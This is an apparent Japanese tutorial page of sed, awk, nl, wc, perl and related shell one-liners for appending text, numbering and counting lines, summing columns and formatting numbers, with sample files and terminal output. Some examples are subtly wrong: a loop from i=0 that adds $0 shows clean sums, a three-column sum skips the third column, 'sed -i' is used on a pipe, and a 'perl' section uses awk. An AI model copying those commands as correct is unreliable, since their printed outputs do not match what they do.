<div class=highlight><pre tabindex=0 class=chroma><code class=language-:regex01.txt data-lang=:regex01.txt>Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat regex01.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
bash-3.2$ cat regex01.txt | sed '$a ENDLINE'
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
ENDLINE
bash-3.2$
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd><code>$a</code> は最下行を意味します。</dd>
</dl>
</div>
<h3 id=sed-ファイルの末尾に複数行の文字列を追加>sed ファイルの末尾に複数行の文字列を追加</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:regex01.txt data-lang=:regex01.txt>Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat regex01.txt | sed '$a ENDLINE'
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
ENDLINE
bash-3.2$ cat regex01.txt | sed '$a ENDLINE\nLine1\nLine2'
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
ENDLINE
Line1
Line2
bash-3.2$
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd><code>$a</code> は最下行を意味します。</dd>
</dl>
</div>
<h3 id=sed-ファイルの先頭に文字列を追加-例->sed ファイルの先頭に文字列を追加 (例: &ldquo;[")</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>cat filename <span class=p>|</span> sed -i <span class=s1>&#39;1s/^/[/&#39;</span>
</code></pre></div><h3 id=sed-ファイルの末尾に文字列を追加-例->sed ファイルの末尾に文字列を追加 (例: &ldquo;]")</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>cat filename <span class=p>|</span> sed <span class=s1>&#39;$s/$/]/&#39;</span>
</code></pre></div><h3 id=sed-ページの最後に改行を追加>sed ページの最後に改行を追加</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>cat filaname <span class=p>|</span> sed <span class=s1>&#39;$a\&#39;</span>
</code></pre></div><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd><code>$a</code> は最下行を意味します。</dd>
<dd><code>\</code> は改行を意味します。</dd>
<dd>空行を挿入する場合は <code>$a \\</code> となります。</dd>
</dl>
</div>
<h3 id=sed-すべての行の先頭に文字列を追加します-例-bbo>sed すべての行の先頭に文字列を追加します (例: &lsquo;bbo&rsquo;)</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>cat filename <span class=p>|</span> sed -e <span class=s1>&#39;s/^/bbo/&#39;</span>
</code></pre></div><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>awkの基本です。<code>^</code> は行頭を意味します。</dd>
</dl>
</div>
<h3 id=sed-各行の末尾に文字列を追加します-例->sed 各行の末尾に文字列を追加します (例: &ldquo;}")</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>cat filename <span class=p>|</span> sed -e <span class=s1>&#39;s/$/\}\]/&#39;</span>
</code></pre></div><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>awkの基本です。<code>$</code> は行末を意味します。</dd>
</dl>
</div>
<h3 id=sed-４番目の文字ごとに改行を追加します>sed ４番目の文字ごとに改行を追加します</h3>
<p>(たとえば、4 番目の文字ごと)</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>cat filename <span class=p>|</span> sed <span class=s1>&#39;s/.\{4\}/&amp;\n/g&#39;</span>
</code></pre></div><h2 id=行番号の付与>行番号の付与</h2>
<h3 id=sed-タブを使用して各行に左揃えで行番号を付与>sed タブを使用して各行に左揃えで行番号を付与</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:country.txt data-lang=:country.txt>Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat country.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
bash-3.2$ sed = country.txt | sed 'N;s/\n/\t/'
1    Hello,Japan!
2    Hello,America!
3    Hello,France!
4    Hello,China!
bash-3.2$
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd><code>N</code> で行番号を付与、行番号の後ろの改行をタブに置き換えています。</dd>
</dl>
</div>
<h3 id=awk-タブを使用して各行に左揃えで行番号を付与>awk タブを使用して各行に左揃えで行番号を付与</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:country.txt data-lang=:country.txt>Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat country.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
bash-3.2$ cat country.txt | awk '{print FNR &quot;\t&quot; $0}'
1    Hello,Japan!
2    Hello,America!
3    Hello,France!
4    Hello,China!
bash-3.2$
</code></pre><p>参考：FNR（行番号）とNR(行番号）の違い</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:FNR01.txt data-lang=:FNR01.txt>abc withdrawal
def payment
xyz deposit
xxx balance
</code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-:FNR02.txt data-lang=:FNR02.txt>20081010 1123 xxx
20081011 1234 def
20081012 0933 xyz
20081013 0512 abc
20081013 0717 def
</code></pre></div><pre tabindex=0><code>$ awk '{print NR&quot;:&quot;FNR}' FNR01.txt FNR02.txt
1:1
2:2
3:3
4:4
5:1
6:2
7:3
8:4
9:5
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>NRとFNRの違いは、NRが通し番号なのに対して、FNRがファイル毎に振られる番号であるという点があります。</dd>
</dl>
</div>
<h3 id=awk-タブを使用して各行の前に行番号を付けます>awk タブを使用して各行の前に行番号を付けます。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:country.txt data-lang=:country.txt>Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat country.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
bash-3.2$ cat country.txt | awk '{print NR &quot;\t&quot; $0}'
1    Hello,Japan!
2    Hello,America!
3    Hello,France!
4    Hello,China!
bash-3.2$
</code></pre><p>参考：NR（行番号）</p>
<pre tabindex=0><code>bash-3.2$ cat calc02.txt
10  11  1
12  13  1
14  15  1
16  17  1
18  19  1
20  21  1
bash-3.2$ cat calc02.txt | awk '{ print NR}'
1
2
3
4
5
6
bash-3.2$
</code></pre><h3 id=nl-行番号を付ける-左揃え右揃えの番号>nl 行番号を付ける (左揃え、右揃えの番号)。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:country.txt data-lang=:country.txt>Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat country.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
bash-3.2$ cat country.txt | nl
     1    Hello,Japan!
     2    Hello,America!
     3    Hello,France!
     4    Hello,China!
bash-3.2$
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>行番号を付与する場合、一般的なのは <code>nl</code> コマンドです。</dd>
<dd>オプションも豊富なので、詳しくは <code>man nl</code> を見てください。</dd>
</dl>
</div>
<h3 id=sed-行番号を付ける-左揃え右揃えの番号>sed 行番号を付ける (左揃え、右揃えの番号)。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:country.txt data-lang=:country.txt>Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat country.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
bash-3.2$ sed = country.txt | sed 'N; s/^/      /;s/ *\(.\{6,\}\)\n/\1  /'
     1  Hello,Japan!
     2  Hello,America!
     3  Hello,France!
     4  Hello,China!
bash-3.2$
</code></pre><h3 id=awk-行番号を付ける-左揃え右揃えの番号>awk 行番号を付ける (左揃え、右揃えの番号)。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:country.txt data-lang=:country.txt>Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat country.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
bash-3.2$ cat country.txt | awk '{printf(&quot;%6d : %s\n&quot;,NR,$0)}'
     1 : Hello,Japan!
     2 : Hello,America!
     3 : Hello,France!
     4 : Hello,China!
bash-3.2$
</code></pre><p>参考：NR（行番号）</p>
<pre tabindex=0><code>bash-3.2$ cat calc02.txt
10  11  1
12  13  1
14  15  1
16  17  1
18  19  1
20  21  1
bash-3.2$ cat calc02.txt | awk '{ print NR}'
1
2
3
4
5
6
bash-3.2$
</code></pre><h3 id=sed-行が空白でない場合にのみ行番号を付ける>sed 行が空白でない場合にのみ行番号を付ける。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:country02.txt data-lang=:country02.txt>Hello,Japan!
Hello,America!

Hello,France!

Hello,China!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat country02.txt
Hello,Japan!
Hello,America!

Hello,France!

Hello,China!
bash-3.2$ sed '/./=' country02.txt | sed '/./N; s/\n/ /'
1 Hello,Japan!
2 Hello,America!

4 Hello,France!

6 Hello,China!
bash-3.2$
</code></pre><h3 id=awk-行が空白でない場合にのみ行番号を付ける>awk 行が空白でない場合にのみ行番号を付ける。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:country02.txt data-lang=:country02.txt>Hello,Japan!
Hello,America!

Hello,France!

Hello,China!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat country02.txt
Hello,Japan!
Hello,America!

Hello,France!

Hello,China!
bash-3.2$ cat country02.txt | awk 'NF{ $0=++a &quot; :&quot; $0};1'
1 :Hello,Japan!
2 :Hello,America!

3 :Hello,France!

4 :Hello,China!
bash-3.2$
</code></pre><h3 id=awk-行が空白でない場合にのみ行番号を付ける-1>awk 行が空白でない場合にのみ行番号を付ける。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:country02.txt data-lang=:country02.txt>Hello,Japan!
Hello,America!

Hello,France!

Hello,China!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat country02.txt
Hello,Japan!
Hello,America!

Hello,France!

Hello,China!
bash-3.2$ cat country02.txt | awk '{print (NF? ++a &quot; :&quot; :&quot;&quot;) $0}'
1 :Hello,Japan!
2 :Hello,America!

3 :Hello,France!

4 :Hello,China!
bash-3.2$
</code></pre><h3 id=awk-空白行を詰めた除去した上で行番号を付与>awk 空白行を詰めた（除去した）上で行番号を付与</h3>
<pre tabindex=0><code>bash-3.2$ cat country02.txt
Hello,Japan!
Hello,America!

Hello,France!

Hello,China!
bash-3.2$ cat country02.txt | awk '{print (NF? ++a &quot; :&quot; :&quot;&quot;) $0}' | grep -v ^$
1 :Hello,Japan!
2 :Hello,America!
3 :Hello,France!
4 :Hello,China!
bash-3.2$
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd><code>cat</code> の後で <code>grep -v ^$</code> をしてから行番号を付与しても良いですね。</dd>
</dl>
</div>
<h3 id=sed-特定の行番号に文字列を追加します-例-1-行目と-3-行目に-something-を追加>sed 特定の行番号に文字列を追加します (例: 1 行目と 3 行目に &lsquo;something&rsquo; を追加)</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>cat filename <span class=p>|</span> sed -e <span class=s1>&#39;1isomething&#39;</span> -e <span class=s1>&#39;3isomething&#39;</span>
</code></pre></div><h3 id=awk-行番号と各行の文字数を出力する>awk 行番号と各行の文字数を出力する</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>awk <span class=s1>&#39;{print NR,length($0);}&#39;</span>
</code></pre></div><p>参考：NR（行番号）</p>
<pre tabindex=0><code>bash-3.2$ cat calc02.txt
10  11  1
12  13  1
14  15  1
16  17  1
18  19  1
20  21  1
bash-3.2$ cat calc02.txt | awk '{ print NR}'
1
2
3
4
5
6
bash-3.2$
</code></pre><h3 id=awk-すべての行に番号インデックスを付ける>awk すべての行に番号/インデックスを付ける</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>awk <span class=s1>&#39;{printf(&#34;%s\t%s\n&#34;,NR,$0)}&#39;</span>
</code></pre></div><p>参考：NR（行番号）</p>
<pre tabindex=0><code>bash-3.2$ cat calc02.txt
10  11  1
12  13  1
14  15  1
16  17  1
18  19  1
20  21  1
bash-3.2$ cat calc02.txt | awk '{ print NR}'
1
2
3
4
5
6
bash-3.2$
</code></pre><h2 id=行カウント>行カウント</h2>
<h3 id=wc-行のカウント>wc 行のカウント</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:country.txt data-lang=:country.txt>Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat country.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
bash-3.2$ cat country.txt | wc -l
       4
bash-3.2$
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd><code>wc -l</code> は基本中の基本です。是が非でも覚えてください。</dd>
</dl>
</div>
<h3 id=sed-行のカウント>sed 行のカウント</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:country.txt data-lang=:country.txt>Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat country.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
bash-3.2$ cat country.txt | sed -n '$='
4
bash-3.2$
</code></pre><h3 id=awk-行のカウント>awk 行のカウント</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:country.txt data-lang=:country.txt>Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat country.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
bash-3.2$ cat country.txt | awk 'END{print NR}'
4
bash-3.2$
</code></pre><p>参考：NR（行番号）</p>
<pre tabindex=0><code>bash-3.2$ cat calc02.txt
10  11  1
12  13  1
14  15  1
16  17  1
18  19  1
20  21  1
bash-3.2$ cat calc02.txt | awk '{ print NR}'
1
2
3
4
5
6
bash-3.2$
</code></pre><h2 id=行列の計算と操作>行列の計算と操作</h2>
<h3 id=awk-行a列とb列の合計を出力>awk 行（A列とB列）の合計を出力</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:calc.txt data-lang=:calc.txt>10  11
12  13
14  15
16  17
18  19
20  21
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat calc.txt
10  11
12  13
14  15
16  17
18  19
20  21
bash-3.2$ cat calc.txt | awk '{s=0;for(i=0;i&lt;NF;i++) s=s+$i; print s}'
21
25
29
33
37
41
bash-3.2$
</code></pre><p>参考：NF（列数）</p>
<pre tabindex=0><code>bash-3.2$ cat calc02.txt | awk '{ print NF }'
3
3
3
3
3
3
bash-3.2$
</code></pre><h3 id=awk-行a列とb列とc列の合計を出力>awk 行（A列とB列とC列）の合計を出力</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:calc02.txt data-lang=:calc02.txt>10  11	1
12  13	1
14  15	1
16  17	1
18  19	1
20  21	1
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat calc02.txt
10  11  1
12  13  1
14  15  1
16  17  1
18  19  1
20  21  1
bash-3.2$ cat calc02.txt | awk '{s=0;for(i=1;i&lt;NF;i++)s=s+$i;print s}'
21
25
29
33
37
41
bash-3.2$
</code></pre><p>参考：NF（列数）</p>
<pre tabindex=0><code>bash-3.2$ cat calc02.txt | awk '{ print NF }'
3
3
3
3
3
3
bash-3.2$
</code></pre><h3 id=awk-各列の値が０より小さい場合に特定の文字列にに置き換える>awk 各列の値が０より小さい場合に特定の文字列にに置き換える</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:calc03.txt data-lang=:calc03.txt>10  11  1
12  13  1
14  -15 1
16  17  1
18  19  1
20  21  1
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat calc03.txt
10  11  1
12  13  1
14  -15 1
16  17  1
18  19  1
20  21  1
bash-3.2$ cat calc03.txt | awk '{for(i=0;i&lt;NF;i++)if($i&lt;0)$i=&quot;Nega&quot;; print }'
10  11  1
12  13  1
14 Nega 1
16  17  1
18  19  1
20  21  1
bash-3.2$
</code></pre><p>参考：NF（列数）</p>
<pre tabindex=0><code>bash-3.2$ cat calc02.txt | awk '{ print NF }'
3
3
3
3
3
3
bash-3.2$
</code></pre><h3 id=awk-各行の列数を出力その後に次の行を出力>awk 各行の列数を出力、その後に次の行を出力</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:calc04.txt data-lang=:calc04.txt>10  11  1
12  13  1
14  15 
16  17  1
18  19
20  21  1
</code></pre></div><pre tabindex=0><code>sh-3.2$ cat calc04.txt
10  11  1
12  13  1
14  15
16  17  1
18  19
20  21  1
bash-3.2$ cat calc04.txt | awk '{print NF &quot; : &quot; $0}'
3 : 10  11  1
3 : 12  13  1
2 : 14  15
3 : 16  17  1
2 : 18  19
3 : 20  21  1
bash-3.2$
</code></pre><p>参考：NF（列数）</p>
<pre tabindex=0><code>bash-3.2$ cat calc02.txt | awk '{ print NF }'
3
3
3
3
3
3
bash-3.2$
</code></pre><h3 id=awk-各行の最後の列を出力>awk 各行の最後の列を出力</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:calc04.txt data-lang=:calc04.txt>10  11  1
12  13  1
14  15 
16  17  1
18  19
20  21  1
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat calc04.txt
10  11  1
12  13  1
14  15
16  17  1
18  19
20  21  1
bash-3.2$ cat calc04.txt | awk '{print $NF &quot; : &quot; $0}'
1 : 10  11  1
1 : 12  13  1
15 : 14  15
1 : 16  17  1
19 : 18  19
1 : 20  21  1
bash-3.2$
</code></pre><p>参考：NF（列数）</p>
<pre tabindex=0><code>bash-3.2$ cat calc02.txt | awk '{ print NF }'
3
3
3
3
3
3
bash-3.2$
</code></pre><h3 id=awk-最初の列を除くすべてを出力>awk 最初の列を除くすべてを出力</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:calc04.txt data-lang=:calc04.txt>10  11  1
12  13  1
14  15 
16  17  1
18  19
20  21  1
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat calc04.txt
10  11  1
12  13  1
14  15
16  17  1
18  19
20  21  1
bash-3.2$ cat calc04.txt | awk '{$1=&quot;&quot;;print substr($0,2)}'
11 1
13 1
15
17 1
19
21 1
bash-3.2$
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd></dd>
</dl>
</div>
<h3 id=awk-最後の行の最後の列を出力>awk 最後の行の最後の列を出力</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:calc04.txt data-lang=:calc04.txt>10  11  1
12  13  1
14  15 
16  17  1
18  19
20  21  1
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat calc04.txt
10  11  1
12  13  1
14  15
16  17  1
18  19
20  21  1
bash-3.2$ cat calc04.txt | awk '{field=$NF}END{print field}'
1
bash-3.2$
</code></pre><p>参考：NF（列数）</p>
<pre tabindex=0><code>bash-3.2$ cat calc02.txt | awk '{ print NF }'
3
3
3
3
3
3
bash-3.2$
</code></pre><h3 id=awk-３つ以上の列を含むすべての行を出力>awk ３つ以上の列を含むすべての行を出力</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:calc04.txt data-lang=:calc04.txt>10  11  1
12  13  1
14  15 
16  17  1
18  19
20  21  1
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat calc04.txt
10  11  1
12  13  1
14  15
16  17  1
18  19
20  21  1
bash-3.2$ cat calc04.txt | awk 'NF&gt;2'
10  11  1
12  13  1
16  17  1
20  21  1
bash-3.2$
</code></pre><h3 id=awk-最後の列の値が-2-であるすべての行を出力>awk 最後の列の値が >2 であるすべての行を出力</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:calc04.txt data-lang=:calc04.txt>10  11  1
12  13  1
14  15 
16  17  1
18  19
20  21  1
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat calc04.txt
10  11  1
12  13  1
14  15
16  17  1
18  19
20  21  1
bash-3.2$ cat calc04.txt | awk '$NF&gt;1'
14  15
18  19
bash-3.2$
</code></pre><h3 id=perl-各行の最初の列の値と最後の列の値の合計を出力します>perl 各行の最初の列の値と最後の列の値の合計を出力します。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:calc04.txt data-lang=:calc04.txt>10  11  1
12  13  1
14  15 
16  17  1
18  19
20  21  1
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat calc04.txt
10  11  1
12  13  1
14  15
16  17  1
18  19
20  21  1
bash-3.2$ cat calc04.txt | perl -lane 'print $F[0]+$F[-1]'
11
13
29
17
37
21
bash-3.2$
</code></pre><h3 id=perl-列のすべての数値を-1-増やします>perl 列のすべての数値を 1 増やします。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:calc04.txt data-lang=:calc04.txt>10  11  1
12  13  1
14  15 
16  17  1
18  19
20  21  1
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat calc04.txt
10  11  1
12  13  1
14  15
16  17  1
18  19
20  21  1
bash-3.2$ cat calc04.txt | perl -pe 's/(\d+)/1+$1/ge'
11  12  2
13  14  2
15  16
17  18  2
19  20
21  22  2
bash-3.2$
</code></pre><h3 id=perl-すべての列の値を合計します>perl すべての列の値を合計します。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:calc04.txt data-lang=:calc04.txt>10  11  1
12  13  1
14  15 
16  17  1
18  19
20  21  1
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat calc04.txt | perl -pe 's/(\d+)/1+$1/ge'
11  12  2
13  14  2
15  16
17  18  2
19  20
21  22  2
bash-3.2$ cat calc04.txt | awk '{sum+=$1}END{print sum}'
90
bash-3.2$
</code></pre><h3 id=awk-行を並べ替える>awk 行を並べ替える</h3>
<p>(例: 1 40 35 12 23 > 1 12 23 35 40)</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>awk <span class=s1>&#39; {split( $0, a, &#34;\t&#34; ); asort( a ); for( i = 1; i &lt;= length(a); i++ ) printf( &#34;%s\t&#34;, a[i] ); printf( &#34;\n&#34; ); }&#39;</span>
</code></pre></div><h3 id=awk-２つの列を逆順で出力>awk ２つの列を逆順で出力</h3>
<pre tabindex=0><code>bash-3.2$ echo &quot;world.&quot; &quot;Hello, &quot; | awk '{ print $2, $1;}'
Hello, world.
bash-3.2$
</code></pre><h3 id=awk-２つの列を逆順で出力-1>awk ２つの列を逆順で出力</h3>
<pre tabindex=0><code>bash-3.2$ echo &quot;Hello,&quot; &quot;world.&quot; | awk '{for (i=NF; i&gt;0; i--) printf(&quot;%s &quot;,$i);print &quot;&quot;}'
world. Hello,
bash-3.2$
</code></pre><pre tabindex=0><code>bash-3.2$ echo &quot;world.&quot; &quot;Hello, &quot; | awk '{tmp=$1;$1=$2;$2=tmp;}END{print}'
Hello, world.
bash-3.2$
</code></pre><h3 id=awk-列にカンマがあるかどうかを確認します-例-列-1>awk 列にカンマがあるかどうかを確認します (例: 列 $1)</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>awk <span class=s1>&#39;$1~/,/ {print}&#39;</span> 
</code></pre></div><h3 id=cut-２列目以降を出力>cut ２列目以降を出力</h3>
<pre tabindex=0><code>bash-3.2$ echo &quot;Hello,&quot; &quot;world.&quot; | cut -d' ' -f2-
world.
</code></pre><h3 id=awk-２列目以降を出力>awk ２列目以降を出力</h3>
<pre tabindex=0><code>bash-3.2$ echo &quot;Hello,&quot; &quot;world.&quot; | awk '{$1=&quot;&quot;;}END{print;}'
 world.
bash-3.2$
</code></pre><h3 id=awk-列間にカンマ区切りを使用して5-行ごとに入力を連結します>awk 列間にカンマ区切りを使用して、5 行ごとに入力を連結します。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>awk <span class=s1>&#39;ORS=NR%5?&#34;,&#34;:&#34;\n&#34;&#39;</span>
</code></pre></div><p>参考：NR（行番号）</p>
<pre tabindex=0><code>bash-3.2$ cat calc02.txt
10  11  1
12  13  1
14  15  1
16  17  1
18  19  1
20  21  1
bash-3.2$ cat calc02.txt | awk '{ print NR}'
1
2
3
4
5
6
bash-3.2$
</code></pre><h3 id=join-指定した列を使用して結合>join 指定した列を使用して結合</h3>
<p>（例：fileAの３列目とfileBの５列目を結合）</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>join -1 <span class=m>3</span> -2 <span class=m>5</span> fileA fileB
</code></pre></div><h3 id=awk-列の先頭に文字列を追加します-たとえば列-3-にchrを追加します>awk 列の先頭に文字列を追加します (たとえば、列 $3 に「chr」を追加します)。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>awk <span class=s1>&#39;BEGIN{OFS=&#34;\t&#34;}$3=&#34;chr&#34;$3&#39;</span>
</code></pre></div><h3 id=awk-最後の列を削除>awk 最後の列を削除</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>awk <span class=s1>&#39;NF{NF-=1};1&#39;</span> file
</code></pre></div><h3 id=join-2-つのファイルを列ごとにタブで結合>join 2 つのファイルを列ごとにタブで結合</h3>
<p>(デフォルトでは両方のファイルの最初の列で結合し、デフォルトのセパレータはスペースです)</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>join -t <span class=s1>&#39;\t&#39;</span> fileA fileB
</code></pre></div><h3 id=rev-cut-ファイルの最後の列を切り取って取得する>rev cut ファイルの最後の列を切り取って取得する</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>cat file<span class=p>|</span>rev <span class=p>|</span> cut -d/ -f1 <span class=p>|</span> rev
</code></pre></div><h3 id=rev-cut-最後の列を切り取る>rev cut 最後の列を切り取る</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>cat filename<span class=p>|</span>rev<span class=p>|</span>cut -f1<span class=p>|</span>rev
</code></pre></div><h2 id=数値の変換>数値の変換</h2>
<h3 id=awk-ファイル内のすべての番号を四捨五入>awk ファイル内のすべての番号を四捨五入</h3>
<p>(例: 有効数字 2 桁)</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>awk <span class=s1>&#39;{while (match($0,/[0-9]+\[0-9]+/)){printf &#34;%s%.2f&#34;,substr($0,0,RSTART-1),substr($0,RSTART,RLENGTH)$0=substr($0, RSTART+RLENGTH)}print}&#39;</span>
</code></pre></div><h3 id=awk-ファイルの平均>awk ファイルの平均</h3>
<p>(ファイルの各行には 1 つの数値のみが含まれます)</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>awk <span class=s1>&#39;{s+=$1}END{print s/NR}&#39;</span>
</code></pre></div><p>参考：NR（行番号）</p>
<pre tabindex=0><code>bash-3.2$ cat calc02.txt
10  11  1
12  13  1
14  15  1
16  17  1
18  19  1
20  21  1
bash-3.2$ cat calc02.txt | awk '{ print NR}'
1
2
3
4
5
6
bash-3.2$
</code></pre><h3 id=awk-前の行の値を減算します>awk 前の行の値を減算します</h3>
<p>(column4 から最後の column5 を引いた値に等しい column6 を追加します)</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>awk <span class=s1>&#39;{$6 = $4 - prev5; prev5 = $5; print;}&#39;</span>
</code></pre></div><h3 id=gsed-数値文字列に３桁区切りを付与>gsed 数値文字列に３桁区切りを付与</h3>
<pre tabindex=0><code>bash-3.2$ echo &quot;12345678910&quot; | gsed ':a;s/\B[0-9]\{3\}\&gt;/,&amp;/;ta'
12,345,678,910
bash-3.2$
</code></pre><h3 id=gsed-数値文字列に３桁区切りを付与-1>gsed 数値文字列に３桁区切りを付与</h3>
<pre tabindex=0><code>bash-3.2$ echo &quot;12345678910&quot; |sed -e :a -e 's/\(.*[0-9]\)\([0-9]\{3\}\)/\1,\2/;ta'
12,345,678,910
bash-3.2$
</code></pre><h3 id=sed-小数点とマイナス記号を含む数値にカンマを追加>sed 小数点とマイナス記号を含む数値にカンマを追加</h3>
<pre tabindex=0><code>bash-3.2$ echo &quot;1234.56 -789.10&quot; |sed -e :a -e 's/\(.*[0-9]\)\([0-9]\{3\}\)/\1,\2/;ta'
1,234.56 -789.10
bash-3.2$
</code></pre><h2 id=単語や文字列のカウント>単語や文字列のカウント</h2>
<h3 id=awk-すべての行の列-単語-の総数を出力>awk すべての行の列 (「単語」) の総数を出力</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:doc01.txt data-lang=:doc01.txt>This book is suitable for classroom use as a general introduction to programming concepts.  
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
bash-3.2$ cat doc01.txt | awk '{total=total+NF};END{print total}'
14
bash-3.2$
</code></pre><h3 id=awk-特定の単語を含む列の単語の総数を出力>awk 特定の単語を含む列の（「単語」）の総数を出力</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:doc02.txt data-lang=:doc02.txt>This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat doc02.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
